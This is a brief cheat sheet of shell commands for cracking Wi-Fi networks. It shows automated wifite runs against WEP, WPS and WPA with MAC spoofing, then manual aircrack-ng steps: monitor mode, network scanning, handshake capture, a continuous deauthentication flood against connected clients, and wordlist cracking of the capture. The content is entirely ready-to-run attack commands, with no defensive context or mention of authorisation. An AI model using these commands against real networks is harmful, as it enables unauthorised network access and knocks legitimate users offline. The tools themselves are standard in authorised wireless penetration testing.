
### Automated

**WEP / WPS attack**

```
wifite -wpa -wps -wep -mac --kill
```

**All attacks**

```
wifite -mac --kill
```

### Manual

**Kill potentially interfering processes**

```
airmon-ng check kill
```

**Set interface to monitor mode**

```
airmon-ng start <INTERFACE>
```

**List wireless networks**

```
airodump-ng <INTERFACE>
```

**Attempt to crack a network, saving a capture (.cap) file**

```
airodump-ng --bssid <BSSID> -c <CHANNEL> -w <SAVE-PATH> <INTERFACE>
```

**Deauthenticate clients**

```
aireplay-ng --deauth 0 -a <MAC-ADDRESS> <INTERFACE>
```

**Attempt to crack a network**

```
aircrack-ng <PATH-TO-CAP-FILE> -w <PATH-TO-WORD-LIST>
```

**Set an interface to managed mode**

```
airmon-ng stop <INTERFACE>
```

**Restart the Network manager**

```
service NetworkManager restart
```
